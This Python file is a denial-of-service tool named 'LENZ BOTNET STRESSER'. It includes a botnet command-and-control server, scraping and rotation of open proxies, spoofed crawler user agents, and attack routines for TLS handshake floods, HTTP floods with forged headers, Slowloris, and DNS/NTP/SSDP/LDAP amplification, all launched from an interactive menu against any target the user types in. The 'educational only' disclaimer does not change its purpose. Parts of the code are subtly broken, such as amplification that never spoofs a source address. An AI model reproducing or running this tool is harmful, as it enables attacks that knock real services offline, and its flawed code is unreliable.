#!/usr/bin/env python3
"""
██████╗░░█████╗░████████╗██╗███╗░░██╗███████╗████████╗
██╔══██╗██╔══██╗╚══██╔══╝██║████╗░██║██╔════╝╚══██╔══╝
██║░░██║██║░░██║░░░██║░░░██║██╔██╗██║█████╗░░░░░██║░░░
██║░░██║██║░░██║░░░██║░░░██║██║╚████║██╔══╝░░░░░██║░░░
██████╔╝╚█████╔╝░░░██║░░░██║██║░╚███║███████╗░░░██║░░░
╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚══════╝░░░╚═╝░░░
                    LENZ BOTNET STRESSER v8.0
              AUTO-PROXY + USER-AGENT ROTATION SYSTEM
"""

import os
import sys
import time
import socket
import ssl
import threading
import random
import requests
import json
import base64
import hashlib
import struct
import urllib.parse
import concurrent.futures
from datetime import datetime
import subprocess
import asyncio
import aiohttp
import socks
from fake_useragent import UserAgent
from cryptography.fernet import Fernet
import dns.resolver
import ipaddress

# ==================== CONFIGURATION ====================
class LenzConfig:
    # Thread Configuration
    MAX_THREADS = 2000
    ATTACK_DURATION = 600  # 10 minutes
    SOCKET_TIMEOUT = 15
    CONNECTION_TIMEOUT = 10
    
    # Proxy Configuration
    PROXY_SOURCES = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"
    ]
    
    # User-Agent Configuration
    UA = UserAgent()
    
    # Botnet Configuration
    BOTNET_NODES = []
    MAX_BOTS = 100
    BOT_COMMAND_PORT = 31337
    BOT_HEARTBEAT_PORT = 31338

# ==================== ENCRYPTION ====================
class Encryption:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt(self, data):
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, encrypted):
        return self.cipher.decrypt(encrypted).decode()

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.lock = threading.Lock()
        self.last_update = 0
    
    def fetch_proxies(self):
        """Fetch proxies from multiple sources"""
        print("[+] Fetching proxies from multiple sources...")
        all_proxies = set()
        
        for source in LenzConfig.PROXY_SOURCES:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        proxy = proxy.strip()
                        if proxy and ':' in proxy:
                            all_proxies.add(proxy)
                print(f"[✓] Fetched {len(proxies)} from {source.split('/')[2]}")
            except:
                pass
        
        self.proxies = list(all_proxies)
        print(f"[+] Total proxies: {len(self.proxies)}")
        return self.proxies
    
    def validate_proxy(self, proxy):
        """Validate proxy functionality"""
        try:
            ip, port = proxy.split(':')
            test_url = "http://httpbin.org/ip"
            
            session = requests.Session()
            session.proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            session.timeout = 5
            
            response = session.get(test_url)
            if response.status_code == 200:
                with self.lock:
                    self.working_proxies.append(proxy)
                return True
        except:
            pass
        return False
    
    def validate_all(self, max_proxies=500):
        """Validate multiple proxies"""
        print(f"[+] Validating {min(len(self.proxies), max_proxies)} proxies...")
        self.working_proxies = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            for proxy in self.proxies[:max_proxies]:
                futures.append(executor.submit(self.validate_proxy, proxy))
            
            for future in concurrent.futures.as_completed(futures):
                pass
        
        print(f"[✓] Working proxies: {len(self.working_proxies)}")
        return self.working_proxies
    
    def get_random_proxy(self):
        """Get random working proxy"""
        if not self.working_proxies:
            return None
        return random.choice(self.working_proxies)
    
    def create_proxy_chain(self, num_proxies=3):
        """Create proxy chain for anonymity"""
        if len(self.working_proxies) < num_proxies:
            return None
        
        chain = []
        for _ in range(num_proxies):
            proxy = self.get_random_proxy()
            if proxy:
                chain.append({
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                })
        return chain

# ==================== USER-AGENT MANAGER ====================
class UserAgentManager:
    def __init__(self):
        self.agents = []
        self.custom_agents = []
        self.load_agents()
    
    def load_agents(self):
        """Load user agents from file and generate"""
        # Built-in agents
        self.custom_agents = [
            # Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            
            # Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
            
            # Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            
            # Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            
            # Mobile
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            
            # Bots (disguised)
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            
            # Custom Lenz Agents
            "LenzBotnet/8.0 (Advanced-Stress-Tester; +https://lenz-security.com)",
            "Mozilla/5.0 (X11; Linux x86_64) Lenz-Stresser/8.0 (KHTML, like Gecko)",
            "Lenz-Mobile-Bot/3.0 (Android 14; SM-G998B) AppleWebKit/537.36"
        ]
        
        # Generate random agents
        try:
            for _ in range(50):
                self.custom_agents.append(LenzConfig.UA.random)
        except:
            pass
        
        self.agents = self.custom_agents
        print(f"[+] Loaded {len(self.agents)} user agents")
    
    def get_random(self):
        """Get random user agent"""
        return random.choice(self.agents)
    
    def get_by_os(self, os_type="windows"):
        """Get user agent by OS type"""
        os_type = os_type.lower()
        filtered = []
        
        for agent in self.agents:
            if os_type == "windows" and "Windows" in agent:
                filtered.append(agent)
            elif os_type == "linux" and "Linux" in agent and "Android" not in agent:
                filtered.append(agent)
            elif os_type == "mac" and "Macintosh" in agent:
                filtered.append(agent)
            elif os_type == "android" and "Android" in agent:
                filtered.append(agent)
            elif os_type == "ios" and "iPhone" in agent:
                filtered.append(agent)
        
        return random.choice(filtered) if filtered else self.get_random()

# ==================== BOTNET MANAGER ====================
class BotnetManager:
    def __init__(self):
        self.bots = {}
        self.command_queue = []
        self.encryption = Encryption()
        self.lock = threading.Lock()
    
    def start_c2_server(self):
        """Start Command & Control server"""
        def c2_handler():
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', LenzConfig.BOT_COMMAND_PORT))
            server.listen(100)
            
            print(f"[+] C2 Server listening on port {LenzConfig.BOT_COMMAND_PORT}")
            
            while True:
                try:
                    client, addr = server.accept()
                    bot_thread = threading.Thread(target=self.handle_bot, args=(client, addr))
                    bot_thread.daemon = True
                    bot_thread.start()
                except:
                    pass
        
        c2_thread = threading.Thread(target=c2_handler)
        c2_thread.daemon = True
        c2_thread.start()
    
    def handle_bot(self, client, addr):
        """Handle bot connection"""
        bot_id = hashlib.md5(f"{addr[0]}_{time.time()}".encode()).hexdigest()[:8]
        
        with self.lock:
            self.bots[bot_id] = {
                'ip': addr[0],
                'port': addr[1],
                'last_seen': time.time(),
                'status': 'connected'
            }
        
        print(f"[+] Bot connected: {bot_id} from {addr[0]}")
        
        try:
            while True:
                # Send command if available
                if self.command_queue:
                    command = self.command_queue.pop(0)
                    encrypted_cmd = self.encryption.encrypt(json.dumps(command))
                    client.send(struct.pack('!I', len(encrypted_cmd)))
                    client.send(encrypted_cmd)
                
                # Receive heartbeat
                client.settimeout(5)
                try:
                    data = client.recv(1024)
                    if data:
                        with self.lock:
                            self.bots[bot_id]['last_seen'] = time.time()
                except socket.timeout:
                    pass
                
                time.sleep(1)
                
        except:
            pass
        finally:
            with self.lock:
                if bot_id in self.bots:
                    del self.bots[bot_id]
            client.close()
    
    def broadcast_command(self, command_type, target, port, duration):
        """Broadcast attack command to all bots"""
        command = {
            'type': command_type,
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': time.time()
        }
        
        self.command_queue.append(command)
        print(f"[+] Command broadcasted to {len(self.bots)} bots")
    
    def get_bot_count(self):
        """Get active bot count"""
        return len(self.bots)
    
    def show_bots(self):
        """Display connected bots"""
        print("\n[+] Connected Bots:")
        print("-" * 60)
        for bot_id, info in self.bots.items():
            last_seen = time.time() - info['last_seen']
            print(f"ID: {bot_id} | IP: {info['ip']} | Status: {info['status']} | Last seen: {last_seen:.1f}s ago")
        print("-" * 60)

# ==================== ATTACK ENGINE ====================
class LenzAttackEngine:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.ua_manager = UserAgentManager()
        self.botnet_manager = BotnetManager()
        self.active = False
        self.stats = {
            'requests_sent': 0,
            'bytes_sent': 0,
            'successful': 0,
            'failed': 0,
            'start_time': 0
        }
        self.attack_threads = []
        
        # Auto-fetch proxies on init
        self.proxy_manager.fetch_proxies()
        self.proxy_manager.validate_all(300)
    
    # ==================== ATTACK METHODS ====================
    
    def tls_handshake_storm(self, target, port, use_proxy=True):
        """Advanced TLS Handshake attack with proxy rotation"""
        while self.active:
            try:
                # Rotate proxy and user agent
                proxy = None
                if use_proxy and self.proxy_manager.working_proxies:
                    proxy = self.proxy_manager.get_random_proxy()
                
                user_agent = self.ua_manager.get_random()
                
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(LenzConfig.SOCKET_TIMEOUT)
                
                # Connect via proxy if available
                if proxy:
                    proxy_ip, proxy_port = proxy.split(':')
                    sock.connect((proxy_ip, int(proxy_port)))
                    
                    # Send CONNECT request for HTTPS
                    connect_req = f"CONNECT {target}:{port} HTTP/1.1\r\n"
                    connect_req += f"Host: {target}:{port}\r\n"
                    connect_req += f"User-Agent: {user_agent}\r\n"
                    connect_req += f"Proxy-Connection: keep-alive\r\n\r\n"
                    
                    sock.send(connect_req.encode())
                    response = sock.recv(4096)
                    
                    if b"200 Connection established" not in response:
                        sock.close()
                        continue
                else:
                    sock.connect((target, port))
                
                # TLS Handshake
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384')
                
                tls_sock = context.wrap_socket(sock, server_hostname=target)
                
                # Send HTTP request
                request = f"""GET / HTTP/1.1\r
Host: {target}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate, br\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Cache-Control: max-age=0\r
\r\n"""
                
                tls_sock.send(request.encode())
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += len(request)
                
                # Try to read response
                try:
                    response = tls_sock.recv(1024)
                    self.stats['successful'] += 1
                except:
                    self.stats['failed'] += 1
                
                tls_sock.close()
                sock.close()
                
            except Exception as e:
                self.stats['failed'] += 1
            finally:
                time.sleep(random.uniform(0.01, 0.1))
    
    def http_flood_with_proxy(self, target, port=80, use_ssl=False):
        """HTTP Flood with proxy and user-agent rotation"""
        url = f"{'https' if use_ssl else 'http'}://{target}"
        if port not in [80, 443]:
            url += f":{port}"
        
        while self.active:
            try:
                # Prepare session with random proxy and UA
                session = requests.Session()
                
                if self.proxy_manager.working_proxies:
                    proxy = self.proxy_manager.get_random_proxy()
                    session.proxies = {
                        'http': f'http://{proxy}',
                        'https': f'http://{proxy}'
                    }
                
                headers = {
                    'User-Agent': self.ua_manager.get_random(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                    'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                }
                
                # Add random parameters to bypass cache
                params = {
                    'rand': hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
                    'cache': str(int(time.time() * 1000)),
                    'lenz': 'botnet'
                }
                
                response = session.get(url, headers=headers, params=params, 
                                      timeout=LenzConfig.CONNECTION_TIMEOUT)
                
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += len(response.content)
                
                if response.status_code < 400:
                    self.stats['successful'] += 1
                else:
                    self.stats['failed'] += 1
                
            except:
                self.stats['failed'] += 1
            finally:
                time.sleep(random.uniform(0.05, 0.2))
    
    def slowloris_attack(self, target, port, use_ssl=False):
        """Slowloris attack with keep-alive connections"""
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(LenzConfig.SOCKET_TIMEOUT)
                sock.connect((target, port))
                
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=target)
                
                # Send partial request
                request = f"POST /{hashlib.md5(str(time.time()).encode()).hexdigest()} HTTP/1.1\r\n"
                request += f"Host: {target}\r\n"
                request += f"User-Agent: {self.ua_manager.get_random()}\r\n"
                request += "Content-Type: application/x-www-form-urlencoded\r\n"
                request += "Content-Length: 1000000\r\n"
                request += "Accept-Encoding: gzip, deflate\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                self.stats['requests_sent'] += 1
                
                # Keep connection alive
                start_time = time.time()
                while self.active and (time.time() - start_time) < 60:
                    try:
                        # Send keep-alive headers
                        sock.send(f"X-{random.randint(1000,9999)}: {random.randint(100000,999999)}\r\n".encode())
                        time.sleep(random.randint(10, 30))
                        self.stats['bytes_sent'] += 50
                    except:
                        break
                
                sock.close()
                self.stats['successful'] += 1
                
            except:
                self.stats['failed'] += 1
            finally:
                time.sleep(0.1)
    
    def udp_amplification(self, target, port):
        """UDP amplification attack"""
        amplification_payloads = {
            53: self.create_dns_query(),  # DNS
            123: self.create_ntp_request(),  # NTP
            1900: self.create_ssdp_search(),  # SSDP
            389: self.create_ldap_search(),  # LDAP
        }
        
        while self.active:
            try:
                for amp_port, payload in amplification_payloads.items():
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    
                    # Send to amplification server (spoofed source IP)
                    for _ in range(3):
                        sock.sendto(payload, (target, amp_port))
                        self.stats['requests_sent'] += 1
                        self.stats['bytes_sent'] += len(payload)
                    
                    sock.close()
                
                self.stats['successful'] += 1
                time.sleep(0.01)
                
            except:
                self.stats['failed'] += 1
    
    # ==================== PAYLOAD GENERATORS ====================
    
    def create_dns_query(self):
        """Create DNS amplification query"""
        transaction_id = os.urandom(2)
        flags = b'\x01\x00'  # Standard query
        questions = b'\x00\x01'  # One question
        answer_rrs = b'\x00\x00'
        authority_rrs = b'\x00\x00'
        additional_rrs = b'\x00\x00'
        
        # Query for isc.org (large response)
        query = b'\x03isc\x03org\x00'  # isc.org
        qtype = b'\x00\xff'  # ANY query
        qclass = b'\x00\x01'  # IN class
        
        return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
    
    def create_ntp_request(self):
        """Create NTP monlist request"""
        # NTP version 2, mode 3 (client)
        header = b'\x17\x00\x03\x2a' + b'\x00' * 8
        return header
    
    def create_ssdp_search(self):
        """Create SSDP search request"""
        request = b'M-SEARCH * HTTP/1.1\r\n'
        request += b'HOST: 239.255.255.250:1900\r\n'
        request += b'MAN: "ssdp:discover"\r\n'
        request += b'MX: 2\r\n'
        request += b'ST: ssdp:all\r\n'
        request += b'USER-AGENT: Lenz-Botnet/8.0\r\n\r\n'
        return request
    
    def create_ldap_search(self):
        """Create LDAP search request"""
        # Simplified LDAP search request
        return b'\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00'
    
    # ==================== ATTACK CONTROLLER ====================
    
    def start_combined_attack(self, target, port, attack_type="all", duration=300):
        """Start combined attack with multiple vectors"""
        print(f"\n[🚀] Starting LENZ STRESSER Attack on {target}:{port}")
        print(f"[⚡] Attack Type: {attack_type.upper()}")
        print(f"[⏱️] Duration: {duration} seconds")
        
        self.active = True
        self.stats = {
            'requests_sent': 0,
            'bytes_sent': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time()
        }
        
        # Resolve target if hostname
        try:
            target_ip = socket.gethostbyname(target)
            print(f"[🔍] Target IP: {target_ip}")
        except:
            target_ip = target
        
        # Start monitoring
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start attack threads based on type
        if attack_type in ["all", "tls"]:
            for _ in range(100):
                t = threading.Thread(target=self.tls_handshake_storm, 
                                   args=(target_ip, port, True))
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
        
        if attack_type in ["all", "http"]:
            for _ in range(100):
                t = threading.Thread(target=self.http_flood_with_proxy,
                                   args=(target_ip, port, port == 443))
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
        
        if attack_type in ["all", "slowloris"]:
            for _ in range(50):
                t = threading.Thread(target=self.slowloris_attack,
                                   args=(target_ip, port, port == 443))
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
        
        if attack_type in ["all", "udp"] and port != 80 and port != 443:
            for _ in range(30):
                t = threading.Thread(target=self.udp_amplification,
                                   args=(target_ip, port))
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
        
        # Start botnet attack if bots available
        if self.botnet_manager.get_bot_count() > 0:
            print(f"[🤖] Engaging {self.botnet_manager.get_bot_count()} botnet nodes")
            self.botnet_manager.broadcast_command(attack_type, target_ip, port, duration)
        
        print(f"[✅] Attack launched with {len(self.attack_threads)} threads")
        print("[⚠️] Attack in progress...\n")
        
        # Wait for duration
        time.sleep(duration)
        
        # Stop attack
        self.stop_attack()
        
        # Show final stats
        self.show_final_stats()
    
    def monitor_attack(self):
        """Monitor attack statistics in real-time"""
        while self.active:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                rps = self.stats['requests_sent'] / elapsed
                mbps = (self.stats['bytes_sent'] * 8) / (elapsed * 1000000)
                
                # Clear and display
                os.system('clear' if os.name == 'posix' else 'cls')
                
                print(f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                    LENZ STRESSER - LIVE ATTACK                    ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}

{Fore.CYAN}┌──────────────────────────────────────────────────────────────┐
│ {Fore.YELLOW}Target:{Fore.WHITE} {self.stats.get('target', 'N/A')} | {Fore.YELLOW}Port:{Fore.WHITE} {self.stats.get('port', 'N/A')} | {Fore.YELLOW}Duration:{Fore.WHITE} {elapsed:.1f}s{Fore.CYAN} │
├──────────────────────────────────────────────────────────────┤
│ {Fore.GREEN}Requests:{Fore.WHITE} {self.stats['requests_sent']:,} | {Fore.GREEN}RPS:{Fore.WHITE} {rps:,.0f} | {Fore.GREEN}Bandwidth:{Fore.WHITE} {mbps:.2f} Mbps{Fore.CYAN} │
│ {Fore.BLUE}Successful:{Fore.WHITE} {self.stats['successful']:,} | {Fore.RED}Failed:{Fore.WHITE} {self.stats['failed']:,} | {Fore.MAGENTA}Success Rate:{Fore.WHITE} {(self.stats['successful']/(self.stats['requests_sent']+1))*100:.1f}%{Fore.CYAN} │
│ {Fore.YELLOW}Proxies Active:{Fore.WHITE} {len(self.proxy_manager.working_proxies)} | {Fore.YELLOW}Bots:{Fore.WHITE} {self.botnet_manager.get_bot_count()}{Fore.CYAN} │
└──────────────────────────────────────────────────────────────┘{Fore.RESET}
                """)
            
            time.sleep(1)
    
    def stop_attack(self):
        """Stop all attack threads"""
        print("\n[!] Stopping attack...")
        self.active = False
        
        # Wait for threads
        time.sleep(2)
        
        # Clear threads
        self.attack_threads.clear()
        print("[✓] Attack stopped")
    
    def show_final_stats(self):
        """Display final attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        
        print(f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                    ATTACK COMPLETE - REPORT                       ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}

{Fore.CYAN}┌──────────────────────────────────────────────────────────────┐
│ {Fore.YELLOW}📊 FINAL STATISTICS{Fore.CYAN}                                       │
├──────────────────────────────────────────────────────────────┤
│ {Fore.GREEN}• Total Duration:{Fore.WHITE} {elapsed:.1f} seconds                        │
│ {Fore.GREEN}• Requests Sent:{Fore.WHITE} {self.stats['requests_sent']:,}                    │
│ {Fore.GREEN}• Data Transferred:{Fore.WHITE} {self.stats['bytes_sent']/1024/1024:.2f} MB       │
│ {Fore.GREEN}• Average RPS:{Fore.WHITE} {self.stats['requests_sent']/elapsed:,.0f}            │
│ {Fore.GREEN}• Peak Bandwidth:{Fore.WHITE} {(self.stats['bytes_sent']*8)/(elapsed*1000000):.2f} Mbps │
│ {Fore.BLUE}• Successful:{Fore.WHITE} {self.stats['successful']:,} | {Fore.RED}Failed:{Fore.WHITE} {self.stats['failed']:,} │
│ {Fore.MAGENTA}• Success Rate:{Fore.WHITE} {(self.stats['successful']/(self.stats['requests_sent']+1))*100:.1f}%          │
└──────────────────────────────────────────────────────────────┘

{Fore.YELLOW}[⚠️] REMEMBER:{Fore.WHITE} This tool is for educational purposes only.
{Fore.YELLOW}[⚠️] WARNING:{Fore.WHITE} Unauthorized use may violate laws in your country.

{Fore.CYAN}LENZ STRESSER v8.0 - Advanced Botnet Stress Testing System{Fore.RESET}
        """)

# ==================== COLOR SUPPORT ====================
class Fore:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    
    # Bright colors
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'

# ==================== MAIN FUNCTION ====================
def main():
    """Main function"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Banner
    print(f"""{Fore.BRIGHT_RED}
    ╦  ╦╔╗╔╔╦╗╔═╗╦═╗╔═╗╔═╗╦ ╦╔═╗╦═╗
    ║  ║║║║ ║║║╣ ╠╦╝╠═╣║  ╠═╣║╣ ╠╦╝
    ╩═╝╩╝╚╝═╩╝╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═
    
    ╔═══════════════════════════════════════════════════╗
    ║            LENZ STRESSER v8.0 - BOTNET            ║
    ║         Auto-Proxy + User-Agent Rotation          ║
    ╚═══════════════════════════════════════════════════╝
    {Fore.RESET}""")
    
    # Legal warning
    print(f"\n{Fore.BRIGHT_RED}{'='*80}")
    print("⚠️  LEGAL WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
    print("   Unauthorized use is illegal and punishable by law.")
    print("   You are responsible for your own actions.")
    print(f"{'='*80}{Fore.RESET}\n")
    
    # Initialize engine
    engine = LenzAttackEngine()
    
    # Start C2 server for botnet
    print("[+] Starting Botnet C2 Server...")
    engine.botnet_manager.start_c2_server()
    
    # Auto-fetch proxies
    print("[+] Auto-fetching proxies...")
    engine.proxy_manager.fetch_proxies()
    working = engine.proxy_manager.validate_all(500)
    print(f"[✓] {len(working)} proxies ready")
    
    # Menu
    while True:
        print(f"""
{Fore.CYAN}┌──────────────────────────────────────────────────────────────┐
│                    {Fore.YELLOW}LENZ STRESSER MENU{Fore.CYAN}                       │
├──────────────────────────────────────────────────────────────┤
│ {Fore.GREEN}[1]{Fore.WHITE} Launch Attack                                  │
│ {Fore.GREEN}[2]{Fore.WHITE} Manage Botnet                                  │
│ {Fore.GREEN}[3]{Fore.WHITE} Proxy Manager                                  │
│ {Fore.GREEN}[4]{Fore.WHITE} Update Resources                               │
│ {Fore.GREEN}[5]{Fore.WHITE} System Info                                    │
│ {Fore.RED}[0]{Fore.WHITE} Exit                                           │
└──────────────────────────────────────────────────────────────┘{Fore.RESET}
        """)
        
        choice = input(f"{Fore.YELLOW}[?] Select option: {Fore.WHITE}").strip()
        
        if choice == "1":
            # Launch attack
            target = input(f"{Fore.GREEN}[+] Target (IP/Domain): {Fore.WHITE}").strip()
            if not target:
                continue
            
            port = input(f"{Fore.GREEN}[+] Port (default 80): {Fore.WHITE}").strip()
            port = int(port) if port.isdigit() else 80
            
            print(f"\n{Fore.YELLOW}[+] Select Attack Type:{Fore.WHITE}")
            print("   [1] TLS Handshake Storm")
            print("   [2] HTTP Flood with Proxies")
            print("   [3] Slowloris Attack")
            print("   [4] UDP Amplification")
            print("   [5] ALL (Combined)")
            
            attack_choice = input(f"{Fore.YELLOW}[?] Choice (1-5): {Fore.WHITE}").strip()
            attack_types = {
                '1': 'tls',
                '2': 'http',
                '3': 'slowloris',
                '4': 'udp',
                '5': 'all'
            }
            attack_type = attack_types.get(attack_choice, 'all')
            
            duration = input(f"{Fore.GREEN}[+] Duration (seconds, default 300): {Fore.WHITE}").strip()
            duration = int(duration) if duration.isdigit() else 300
            
            # Confirm
            confirm = input(f"\n{Fore.RED}[?] Launch attack on {target}:{port}? (y/N): {Fore.WHITE}").strip().lower()
            if confirm == 'y':
                engine.start_combined_attack(target, port, attack_type, duration)
        
        elif choice == "2":
            # Botnet management
            print(f"\n{Fore.CYAN}[+] Botnet Status:{Fore.WHITE}")
            engine.botnet_manager.show_bots()
            
            if engine.botnet_manager.get_bot_count() > 0:
                print(f"\n{Fore.YELLOW}[+] Available Bots: {engine.botnet_manager.get_bot_count()}{Fore.RESET}")
        
        elif choice == "3":
            # Proxy management
            print(f"\n{Fore.CYAN}[+] Proxy Status:{Fore.WHITE}")
            print(f"  • Total Proxies: {len(engine.proxy_manager.proxies)}")
            print(f"  • Working Proxies: {len(engine.proxy_manager.working_proxies)}")
            
            update = input(f"\n{Fore.YELLOW}[?] Update proxy list? (y/N): {Fore.WHITE}").strip().lower()
            if update == 'y':
                engine.proxy_manager.fetch_proxies()
                engine.proxy_manager.validate_all(500)
        
        elif choice == "4":
            # Update resources
            print(f"\n{Fore.CYAN}[+] Updating all resources...{Fore.WHITE}")
            engine.proxy_manager.fetch_proxies()
            engine.proxy_manager.validate_all(500)
            print(f"[✓] Resources updated")
        
        elif choice == "5":
            # System info
            print(f"\n{Fore.CYAN}[+] System Information:{Fore.WHITE}")
            print(f"  • Platform: {sys.platform}")
            print(f"  • Python: {sys.version}")
            print(f"  • Threads Available: {LenzConfig.MAX_THREADS}")
            print(f"  • Proxies: {len(engine.proxy_manager.working_proxies)}")
            print(f"  • Botnet Nodes: {engine.botnet_manager.get_bot_count()}")
        
        elif choice == "0":
            print(f"\n{Fore.YELLOW}[+] Exiting LENZ STRESSER...{Fore.RESET}")
            sys.exit(0)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    try:
        # Install dependencies if missing
        try:
            import fake_useragent
            import aiohttp
            import cryptography
        except ImportError:
            print("[!] Installing required dependencies...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", 
                                  "fake-useragent", "aiohttp", "cryptography", 
                                  "requests", "dnspython"])
        
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")
        sys.exit(1)